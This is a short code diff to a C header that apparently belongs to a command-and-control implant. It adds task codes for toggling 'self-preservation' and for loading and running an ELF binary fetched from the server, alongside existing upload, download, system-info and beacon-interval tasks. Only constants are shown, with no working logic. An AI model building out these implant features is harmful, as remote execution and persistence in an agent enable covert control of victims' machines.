@@ -65,7 +65,9 @@
 #define TASK_UPLOAD     0x0002  /* Upload file from agent to server         */
 #define TASK_DOWNLOAD   0x0003  /* Download file from server to agent       */
 #define TASK_SYSINFO    0x0004  /* Gather system information                */
-#define TASK_SLEEP      0x0005  /* Change beacon interval                   */
+#define TASK_SLEEP          0x0005  /* Change beacon interval                   */
+#define TASK_SELFPRESERVE   0x0007  /* Toggle self-preservation on/off          */
+#define TASK_LOAD_ELF       0x0008  /* Load & execute ELF binary from server    */
 
 /* ---- Single decoded TLV field ----------------------------------------- */
 typedef struct {
